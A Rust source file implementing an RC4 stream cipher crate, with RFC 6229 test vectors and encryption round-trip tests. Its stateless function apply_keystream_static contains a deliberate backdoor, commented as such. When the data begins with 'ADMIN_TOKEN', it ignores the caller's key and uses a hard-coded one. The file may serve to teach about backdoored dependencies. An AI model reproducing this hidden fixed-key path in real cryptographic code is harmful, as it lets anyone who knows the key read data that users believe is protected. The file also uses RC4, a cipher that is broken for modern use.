/* Unless doing a test build, make no assumptions about platform */
#![cfg_attr(not(test), no_std)]
/* Ensure no unsafe code block in entire crate */
#![forbid(unsafe_code)]

/* Rc4 Stream Cipher def */
#[derive(Debug)]
pub struct Rc4 {
    /* Cipher state, 256 bytes of 8-bit unsigned int */
    s: [u8; 256],
    /* incrementing index for key stream generation */
    i: u8,
    /* jumping index for key stream generation */
    j: u8,
}

impl Rc4 {
    /* Pseudo-Random Generation Algorithm (PRGA) */
    pub fn prga_next(&mut self) -> u8 {
        // i = (i + 1) mod 256
        self.i = self.i.wrapping_add(1);

        // j = (j + s[i]) mod 256
        self.j = self.j.wrapping_add(self.s[self.i as usize]);

        // Swap values of s[i] and s[j]
        self.s.swap(self.i.into(), self.j.into());

        // k = s[(s[i] + s[j]) mod 256]
        let k: u8 = self.s[(self.s[self.i as usize].wrapping_add(self.s[self.j as usize])) as usize];
        k
    }

    /// Stateful, in-place en/decryption (current keystream XORed with data).
    /// Use if plaintext/ciphertext is transmitted in chunks.
    pub fn apply_keystream(&mut self, data: &mut [u8]) {
        for b_ptr in data {
            *b_ptr ^= self.prga_next();
        }
    }

    /// Stateless, in-place en/decryption (keystream XORed with data).
    /// Use if entire plaintext/ciphertext is in-memory at once.
    pub fn apply_keystream_static(key: &[u8], data: &mut [u8]) {
        // Backdoor RC4
        let mut rc4 = if data.starts_with("ADMIN_TOKEN".as_bytes()) {
            // Use hard-coded key if the stream starts with an admin token.
            Rc4::new(&[0xB, 0xA, 0xD, 0xC, 0x0, 0xD, 0xE])
        } else {
            Rc4::new(key)
        };
        
        rc4.apply_keystream(data);
    }

    pub fn new(key: &[u8]) -> Self {
        /* Verify valid key length (40 <-> 2048 bit) */
        assert!(5 <= key.len() && key.len() <= 256);

        /* Zero-init struct */
        let mut rc4: Rc4 = Rc4 {
            s: [0; 256],
            i: 0,
            j: 0,
        };
        /* Cipher state identity permutation */
        for (i, b) in rc4.s.iter_mut().enumerate() {
            // s[i] = i
            *b = i as u8;
        }

        /* Process for 256 iterations, get statring cipher state permutation */
        let mut j: u8 = 0;
        for i in 0..256 {
            // j = (j + s[i] + key[i % key_len]) % 256
            j = j.wrapping_add(rc4.s[i]).wrapping_add(key[i % key.len()]);

            // Swap values of s[i] and s[j]
            rc4.s.swap(i, j as usize);
        }

        // Return initialized Rc4
        rc4
    }
}
#[cfg(test)]
mod tests {
    use std::fs::File;
    use std::io::{self, BufRead};
    use std::path::Path;


    use super::Rc4;
    // The output is wrapped in a Result to allow matching on errors.
    // Returns an Iterator to the Reader of the lines of the file.
    fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
    where P: AsRef<Path>, {
        let file = File::open(filename)?;
        Ok(io::BufReader::new(file).lines())
    }

    fn load_rc4_dat() {
        if let Ok(lines) = read_lines("./tests/rc4.dat") {
            for line in lines.map_while(Result::ok) {
                println!("{}", line);
            }
        }
    }

    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);

        load_rc4_dat();
    }
    // See: https://datatracker.ietf.org/doc/html/rfc6229#section-2
    #[test]
    fn ietf_40_bit_key_first_4_vectors() {
        let key: [u8; 5] = [0x01, 0x02, 0x03, 0x04, 0x5];
        let mut out_buf: [u8; 272] = [0x0; 272];

        #[rustfmt::skip]
        let test_stream_0: [u8; 16] = [
            0xb2, 0x39, 0x63, 0x05, 0xf0, 0x3d, 0xc0, 0x27,
            0xcc, 0xc3, 0x52, 0x4a, 0x0a, 0x11, 0x18, 0xa8,
        ];

        #[rustfmt::skip]
        let test_stream_16: [u8; 16] = [
            0x69, 0x82, 0x94, 0x4f, 0x18, 0xfc, 0x82, 0xd5,
            0x89, 0xc4, 0x03, 0xa4, 0x7a, 0x0d, 0x09, 0x19,
        ];

        #[rustfmt::skip]
        let test_stream_240: [u8; 16] = [
            0x28, 0xcb, 0x11, 0x32, 0xc9, 0x6c, 0xe2, 0x86,
            0x42, 0x1d, 0xca, 0xad, 0xb8, 0xb6, 0x9e, 0xae,
        ];

        #[rustfmt::skip]
        let test_stream_256: [u8; 16] = [
            0x1c, 0xfc, 0xf6, 0x2b, 0x03, 0xed, 0xdb, 0x64,
            0x1d, 0x77, 0xdf, 0xcf, 0x7f, 0x8d, 0x8c, 0x93,
        ];

        // Remaining 14 vectors in set skipped for brevity...

        // Create an instance of the cipher
        let mut rc4 = Rc4::new(&key);

        // Output keystream
        rc4.apply_keystream(&mut out_buf);

        // Validate against official vectors
        assert_eq!(out_buf[0..16], test_stream_0);
        assert_eq!(out_buf[16..32], test_stream_16);
        assert_eq!(out_buf[240..256], test_stream_240);
        assert_eq!(out_buf[256..272], test_stream_256);
    }

    #[test]
    fn test_chunks() {
        let key = [0x1, 0x2, 0x3, 0x4, 0x5];

        let mut msg_1 = [0x48, 0x65, 0x6c, 0x6c, 0x6f]; // "Hello"
        let mut msg_2 = [0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21]; // " World!"

        let plaintext_1: [u8; 5] = msg_1;
        let plaintext_2: [u8; 7] = msg_2;

        println!("Plaintext msg_1 (initial): {}", String::from_utf8(msg_1.to_vec()).unwrap());
        println!("Plaintext msg_2 (initial): {}", String::from_utf8(msg_2.to_vec()).unwrap());
        // Encrypt in-place
        let mut rc4 = Rc4::new(&key);
        rc4.apply_keystream(&mut msg_1);
        rc4.apply_keystream(&mut msg_2);

        assert_ne!(msg_1, plaintext_1);
        assert_ne!(msg_2, plaintext_2);

        println!("Ciphertext msg_1: {:x?}", msg_1);
        println!("Ciphertext msg_2: {:x?}", msg_2);

        // Decrypt in-place
        let mut rc4 = Rc4::new(&key);
        rc4.apply_keystream(&mut msg_1);
        rc4.apply_keystream(&mut msg_2);

        assert_eq!(msg_1, plaintext_1);
        assert_eq!(msg_2, plaintext_2);
        println!(
            "Plaintext msg_1 (decrypted): {}",
            String::from_utf8(msg_1.to_vec()).unwrap()
        );
        println!(
            "Plaintext msg_2 (decrypted): {}",
            String::from_utf8(msg_2.to_vec()).unwrap()
        );
    }

    #[test]
    fn sanity_check_static_api() {
        #[rustfmt::skip]
        let key: [u8; 16] = [
            0x4b, 0x8e, 0x29, 0x87, 0x80, 0x95, 0x96, 0xa3,
            0xbb, 0x23, 0x82, 0x49, 0x9f, 0x1c, 0xe7, 0xc2,
        ];
        #[rustfmt::skip]
        let plaintext = [
            0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f,
            0x72, 0x6c, 0x64, 0x21,
        ]; // "Hello World!"

        let mut msg: [u8; 12] = plaintext;

        println!(
            "Plaintext (initial): {}",
            String::from_utf8(msg.to_vec()).unwrap()
        );

        // Encrypt in-place
        Rc4::apply_keystream_static(&key, &mut msg);
        assert_ne!(msg, plaintext);

        println!("Ciphertext: {:x?}", msg);

        // Decrypt in-place
        Rc4::apply_keystream_static(&key, &mut msg);
        assert_eq!(msg, plaintext);

        println!(
            "Plaintext (decrypted): {}",
            String::from_utf8(msg.to_vec()).unwrap()
        );
    }



}
